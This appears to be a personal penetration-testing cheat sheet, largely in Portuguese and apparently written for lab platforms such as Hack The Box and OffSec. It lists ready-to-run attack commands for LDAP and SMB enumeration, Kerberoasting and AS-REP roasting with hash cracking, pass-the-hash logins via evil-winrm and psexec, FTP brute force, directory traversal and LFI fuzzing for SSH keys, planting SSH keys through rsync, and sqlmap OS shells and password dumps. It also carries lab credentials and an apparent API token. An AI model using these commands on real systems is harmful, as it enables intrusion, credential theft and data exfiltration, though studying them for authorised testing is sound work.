*** Information Gathering ***

====================== Procurando SQL Statements ========================

	grep -Ri 'sql' . --color=auto
	grep -Ri 'User ID=sa;Password' . --color=auto


================== Ping Listener ====================

-> Ouvir ICMP requests na NIC tun0
	sudo tcpdump -i tun0 icmp and icmp[icmptype]=icmp-echo
	
====================== Telnet ========================

Protocolo para tentar conectar nas portas

======================== Nmap ===========================
-> Descobrindo Dispositivos na Rede
	nmap -sn 192.168.0.0-254
-> Scan de portas completo retornando versionamento e simple scripts
	nmap -p- -sV -sC $IP --open
-> Scripts do nmap
	/usr/share/nmap/scripts
	
================= LDAP ======================
1. Pegar o dominio
-> Enumerar Domain Names
	ldapsearch -x -H ldap://$IP:389 -s base namingcontexts
	
2. Passo mais importante, obter infos a partir do dominio
-> Obter informações a respeito do Dominio 
	ldapsearch -x -H ldap://192.168.185.122 -D '' -w '' -b "DC=DANTE,DC=local"
	ldapsearch -x -H ldap://$IP:389 -s base "DC=DANTE,DC=ADMIN"
	ldapsearch -x -H ldap://$IP:389 -b "DC=DANTE,DC=local"
	
-> Conseguindo informações de SAMAccounts
	ldapsearch -x -H ldap://192.168.185.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName:

-> Vendo as descrições da conta atrás de senhas
	ldapsearch -x -H ldap://$IP -D '' -w '' -b "DC=DANTE,DC=local" | grep description

3. Outras pesquisas
	
-> Fazendo Querys para obter pessoas nas bases de dados (objectClass é query do windows)
	ldapsearch -x -H ldap://$IP:389 -s base "DC=support,DC=htb" '(objectClass=Person)'
	

========================== Active Directory ===================

1. Conseguindo Users de active directory
	impacket-GetADUsers -dc-ip 10.11.1.120 -all active.htb/USER
	
========================================== Kerberos ==========================================

* Lembrando que GetNPUsers e GetUserSPNs e PSEXEC estão em ~/Desktop/Tools/impacket/examples

[+ ======== Descobrir Accounts sem a Preautenticação do Kerberoast configurada ========] 
1.1 A partir dos DomainNames(que podemos obter com o ldapsearch) podemos obter as hashes dos usuários sem kerberoast
	./GetNPUsers.py -dc-ip 10.11.1.120 -request 'xor.com/'
	./GetNPUsers.py -request -dc-ip 10.11.1.20 svcorp.com/Administrator
	./GetNPUsers.py -request -dc-ip 10.11.1.20 svcorp.com/Administrator:Password
	
2. Podemos quebrar as hashes com
	hashcat -m 18200 -a 0 -o cracked.txt hash /usr/share/wordlists/rockyou.txt
	john --wordlist=/usr/share/wordlists/rockyou.txt hash

-> Ainda conseguimos Exploitar
3.1 Caso não tenhamos quebrado a hash, podemos nos logar no Kali com o comando
	sudo evil-winrm -i 10.10.239.235 -u USER -H DIGITE_A_HASH_AQUI
3.2 Caso tenhamos conseguido, bata usarmos
	sudo evil-winrm -i 10.10.239.235 -u USER -p DIGITE_A_SENhA_AQUI
-> Alternativa
	./psexec.py active.htb/Administrator@10.10.10.100


[+ ======== Descobrir Accounts sem a Preautenticação do Kerberoast configurada com User Enumeration]
1. Descobrir quais usuários estão presentes
	./kerbrute_linux_386 userenum --dc $IP -d dante.local /usr/share/SecLists/Usernames/top-usernames-shortlist.txt
	./kerbrute_linux_386 userenum --dc 10.11.1.120 -d xor.com /usr/share/SecLists/Usernames/Names/names.txt
2. Verificar quais desses usuários estão sem Pre-Auth
	./GetNPUsers.py -usersfile /home/kali/Desktop/usersfile -no-pass -dc-ip 10.11.1.120 svcorp.com/
	
	
	
[+ ======== Descobrir SPNs(Service Principal Names) that are running under a user account ========]
1. Primeiro descobrir a hash
	./GetUserSPNs.py -dc-ip 10.10.10.182 -request 'htb.local/USER'
	sudo ./GetUserSPNs.py -dc-ip $IP -request heist.offsec/enox:california
2. Depois quebrar hehehe 
	hashcat -m 13100 HASH /usr/share/wordlists/rockyou.txt
	john --wordlist=/usr/share/wordlists/rockyou.txt hash
-> Ainda conseguimos Exploitar
3.1 Para logar
	./psexec.py active.htb/Administrator@10.10.10.100

============================== DNS ============================

-> Procurando subdominios
	ffuf -u http://$IP -H 'host: FUZZ.flight.htb' -w /usr/share/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -fs 7069

-> Procurando Domain Names através de Reverse Lookup
	dnsrecon -r 10.10.10.0/24 -n 10.10.10.13

-> Procurando subdominios a partir de um Domain Name
	fierce --domain intelligence.htb --dns-server 10.10.10.248
1. Lembrando que nesse caso  <DNS name admin> significa admin.cronos.htb
2. Lembrando que nesse caso <DNS name ns1> significa ns1.cronos.htb

Com esses dados, podemos adiciona-los ao /etc/hosts e acessar esses sites

-> Adicionar o dominio do nosso Kali no DNS alheio
1. Não esqueecer de ligar o responder para ouvir tudo
	sudo responder -I tun0
2. Adicionar o domínio (com CD ~/Desktop/Tools/DNS)
	./dnstool.py -u "intelligence.htb\Tiffany.Molina" -p "NewIntelligenceCorpUser9876" -a add -d 10.10.14.8 -r web.intelligence.htb 10.10.10.248
	
*********************************** PENTEST *****************************************

Melhores listas :
-rw-r--r-- 1 root root  1115634 Aug  2 05:51 subdomains-top1million-110000.txt
-rw-r--r-- 1 root root   148689 Aug  2 05:51 subdomains-top1million-20000.txt
-rw-r--r-- 1 root root    33566 Aug  2 05:51 subdomains-top1million-5000.txt

-> Enumerando subdomains
1. O melhor é o fierce
	fierce --domain future.com.br --subdomain-file /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
2. Segunda opção
	dnsmap future.com.br -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt


================== SMB ===========================
-> Enumeration
	smbclient -L \\10.11.1.13
-> Enumeration with User
	smbclient -L \\10.10.10.182 -U r.thompson
	smbclient -L \\10.10.10.248 -U Tiffany.Molina --password NewIntelligenceCorpUser9876
-> Enumeration com Nmap
	nmap -p139,445 --script=smb-enum-shares $IP
-> Conectando SMB com usuários
	smbclient //'192.168.0.35'/fluffy -U'fluffy'%'123456'
-> Conectando SMB em null share
	smbclient //'192.168.0.35'/pleadformercy -N
	
-> Enumerating Users
	└─$ nmap --script smb-enum-users -p139,445 10.11.1.115
	└─$ enum4linux -U 127.0.0.1 
	
-> Vulns
	nmap --script vuln 10.1.1.65 -p139,445
	nmap --script smb-vuln-cve2009-3103 -p445 10.1.1.65
	nmap --script smb-vuln-cve-2017-7494 -p 445 10.1.1.65
	nmap --script smb-vuln-ms06-025 -p445 10.1.1.65
	nmap --script smb-vuln-ms07-029 -p445 10.1.1.65
	nmap --script smb-vuln-ms08-067 -p445 10.1.1.65
	nmap --script smb-vuln-ms10-054 -p445 10.1.1.65
	nmap --script smb-vuln-ms10-061 -p445 10.1.1.65
	nmap --script smb-vuln-ms17-010 -p445 10.1.1.65
	
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory


============================ FTP ==============================

-> Multiple Files
	mget *
	mput test*
	
-> Medusa
	medusa -M ftp -C /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -h $IP -v 4

-> All Nmap scripts on FTP
	nmap --script ftp-* -p 21 127.0.0.1
-> Anonymous login
	anonymous:anonymous
-> Check for directory Traversal
	get ../../../../../../etc/passwd
-> Bruteforce accounts
	hydra -s 21 -l admin -P /usr/share/wordlists/rockyou.txt $IP ftp	
-> Scripts
	ftp-bounce.nse
	ftp-brute.nse
	ftp-libopie.nse
	ftp-proftpd-backdoor.nse
	ftp-syst.nse
	ftp-vsftpd-backdoor.nse
	ftp-vuln-cve2010-4221.nse 
	
=========================== RPC ===============================

Boa estimativa para tentar fazer logins

1. Conectando
	rpcclient -N -U "" $IP
	rpcclient -W '' -U''%'' $IP
	rpcclient -U melanie 10.10.10.169

2. Utilizando query para enumerar o serviço
> Enumerar todas as contas
	enumdomusers
********************* PRINCIPAL COMANDO **************************
> Informações armazenadas nas contas (SENHAS podem estar como comentários)
	querydispinfo	
******************************************************************

> Query em um user
	queryuser <Query ID>
> Enumerar privilégios
	enumprivs
> Get Domain password INFO
	getdompwinfo
> Get Users Password INFO (Sendo 0x1f4 o RID obtido em enumdomusers)
	getusrdompwinfo 0x1f4

============================== SNMP =======================================

-> Public Information
	snmpwalk -c public -v2c 10.10.10.116 

-> Enumeration
	snmp-check 10.10.10.116
	snmp-check 10.11.1.115 -p 199
	
============================ POP3 ===============================

-> Connect
	telnet 10.10.10.54 110
	USER mindy
	+OK
	PASS mindy
	RETR 2

====================== Nikto =============================

nikto --host http://'$IP'

=============== SMTP =================
telnet 10.11.1.217 25
VRFY username

cd ~/Desktop/Tools/SMTP

-> Unix Users
	perl smtp-user-enum.pl -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 10.11.1.231
-> Common names
	perl smtp-user-enum.pl -M VRFY -U /usr/share/SecLists/Usernames/Names/names.txt -t 192.168.67.136

=================== Wpscan ============================

[+ User Enumeration]
wpscan --url http://$IP --enumerate u -v

[+ Plugins, Users and Themes Enumeration]
wpscan --url http://10.11.1.251/wp --enumerate p --enumerate t --enumerate u

[+ Vuln Scan]
wpscan --url http://$IP/ --api-token g6IBKY7zRT35QCaans8Ifl5kcCexJorMDMDGbnZ9wsQ

================== JoomScan ==============================

joomscan --host 192.168.0.106

================= Droopescan ====================

-> pyenv path : /home/kali/.pyenv/bin

	kali@kali:~$ echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.zshrc
	kali@kali:~$ echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.zshrc
	kali@kali:~$ echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n  eval "$(pyenv init --path)"\nfi' >> ~/.zshrc

echo 'export PATH="/home/kali/Desktop/Tools/droopescan:$PATH"' >> ~/.zshrc
pyenv global 3.9.4

droopescan scan drupal -u http://10.11.1.50

============== Cewl =================

cewl http://10.11.1.39/otrs/index.pl --write wordlis.txt

cewl $URL -m 5 -d 4 -w ~/Desktop/DC-6/cewl.txt 2>/dev/null



============ Diretorios ================

-> Common Wordlist
	dirb http://10.10.10.68
-> Wordlist aprofundada
	gobuster dir -e -k -u http://127.0.0.1:7443 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o /dev/null -z

==================== WFUZZ ======================

Caso dê erro de SSL, adicionar -Z :
	wfuzz -Z -c -z file,/usr/share/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404,400 https://10.11.1.44:8000/FUZZ


-> Não autenticado FUZZ em arquivos
	wfuzz -c -z file,/usr/share/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 http://$IP:65000/wordpress/FUZZ

-> Autenticado FUZZ em arquivos
	wfuzz -c -z file,/usr/share/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 -b "PHPSESSID=4m8lj9a3rbgbp77phd54oqg1dj" http://127.0.0.1/discuss/admin/FUZZ

-> Não autenticado em Diretórios
	wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 --hh 3861 http://192.168.184.171/FUZZ
	
-> Autenticado em Diretórios
	wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 -b "PHPSESSID=d69qs1avhsjoal0mlbrfl37ej7" http://127.0.0.1:8385/FUZZ
	
-> Testando para SQL Injection
	wfuzz -c -z file,/usr/share/SecLists/Fuzzing/SQLi/quick-SQLi.txt  --hc 404 http://10.11.1.35/section.php?page=FUZZ

-> Não autenticado FUZZ em hexa decimais que possam indicar code injection
	wfuzz -c -z file,/usr/share/SecLists/Fuzzing/URI-hex.txt --hc 404 http://10.11.1.35/section.php?page=FUZZ

-> Nao autenticado FUZZ em parametros
	wfuzz -c -z file,/usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt --hh 0 http://10.11.1.35/section.php?FUZZ=../../../../etc/passwd

-> Autenticado FUZZ em parametros
	wfuzz -c -z file,/usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt --hh 1341 -b "PHPSESSID=d69qs1avhsjoal0mlbrfl37ej7" http://10.10.10.43/manage.php?FUZZ=../../../../etc/passwd

	
[+ LFI e Shellshock]

-> Buscando arquivos comuns em querys (Arquivos de LFI)
1. LFI Jhaddix
	wfuzz -c -z file,/usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 835 http://10.11.1.35/section.php?page=FUZZ
2. Usada para achar arquivos bypassando com base64 (exemplo wp-config)
	wfuzz -c -z file,/usr/share/wordlists/LFI --hh 0 --hc 404 http://127.0.0.1/nav.php?page=FUZZ

-> Buscando arquivos comuns de Windows com LFI
	wfuzz -c -z file,/usr/share/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt http://192.168.185.53:4443/site/index.php?page=FUZZ
	
-> Buscando arquivos de logs Unix através de LFI
	wfuzz -c -z file,/usr/share//wordlists/common-unix-httpd-log-locations.txt --hh 835 http://10.11.1.35/section.php?page=FUZZ
	
-> Buscando arquivos de chaves SSH através de LFI ou Directory Traversal
/usr/share/SecLists/Usernames/Names/names.txt
1. Windows
	wfuzz -c -z file,/usr/share/SecLists/Usernames/Names/names.txt http://10.11.1.35/section.php?file=C:\Users\FUZZ\.ssh\id_rsa
2. Linux
	wfuzz -c -z file,/usr/share/SecLists/Usernames/Names/names.txt http://10.11.1.35/section.php?file=/home/FUZZ/.ssh/id_rsa
		
-> Não autenticado em arquivos CGI
	wfuzz -c -z file,/usr/share/SecLists/Discovery/Web-Content/CGI-XPlatform.fuzz.txt --hc 404 http://10.11.1.141:10000/FUZZ

-> Não autenticado FUZZ em arquivos Shellshock
1. Bom para procurar shellshock em cgi-bin
	wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 404 http://10.10.10.56/cgi-bin/FUZZ.sh
2. Bom para procurar shellshock em arquivos.cgi
	wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 404 http://10.10.10.56/cgi-bin/FUZZ.cgi
	

=============== Rsync ===================

-> Enumerar as shares
	nmap -sV --script "rsync-list-modules" -p 873 $IP
	
-> Listar os arquivos de uma share
	rsync -av --list-only rsync://$IP:873/fox
	
-> Copiar o arquivo de uma share (Exemplo : Share chamada fox para pasta rsyn_shared)
	rsync -av rsync://$IP:873/fox ./rsyn_shared
	
-> Colocar a pasta .ssh e seus arquivos na share fox
	rsync -av .ssh/ rsync://$IP:873/fox/.ssh


================ SQLMap =====================

-> Dentro do sqlmapshell
1. Linux
	-–os-shell
2. Windows
	-–os-cmd <cmd>
3. File Read
	--file-read=/etc/passwd
4. Others
	--current-user #Get current user
	--is-dba #Check if current user is Admin
	--hostname #Get hostname
	--users #Get usernames od DB
	--passwords #Get passwords of users in DB
	--privileges #Get privileges

-> Para realizar requests autenticados
	--cookie "Cookie: OV1364928461=6kb5jvu7f6lg93qlo3vl9111f8" 

-> Com uma requests que contenha SQLi que copiamos do Burp ou ZAP
	sqlmap -r req --dump --dbs
	sqlmap -r req --dump --batch --dbms=mysql --dbs -D users

-> Fazendo DUmps
	sqlmap -u $URL --dbs
	sqlmap -u $URL -D joomladb --tables
	sqlmap -u $URL -D joomladb -T '#__users' --dump
